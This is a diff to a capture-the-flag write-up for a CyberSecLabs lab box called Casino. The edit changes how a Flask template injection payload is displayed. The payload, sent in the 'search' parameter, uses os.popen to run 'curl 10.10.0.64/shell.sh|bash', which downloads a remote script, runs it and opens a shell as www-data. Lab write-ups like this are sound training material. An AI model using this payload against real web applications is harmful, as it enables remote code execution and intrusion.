@@ -97,9 +97,12 @@ Now to clean up, we can remove the linked file at `/etc/systemd/system/multi-use
 Casino was a new box that came out on cyberseclabs. Since it was new I thought I would give it a try. It ended up being quite a fun box since I had never dealt with flask injections prior to this.
 
 The `/search` page of this application is vulnerable to injection and with this we can get complete RCE through the web app to spawn a shell through the `search` paramter. 
+
 ```
-search={{config.__class__.__init__.__globals__['os'].popen('curl 10.10.0.64/shell.sh|bash').read()}}
+search= config.__class__.__init__.__globals__['os'].popen('curl 10.10.0.64/shell.sh|bash').read()
 ```
+Between the start and end of the payload we will need two curly braces, it does not render on the page when I add it in.
+
 This will return a shell as www-data.
 
 ### PRIV ESC
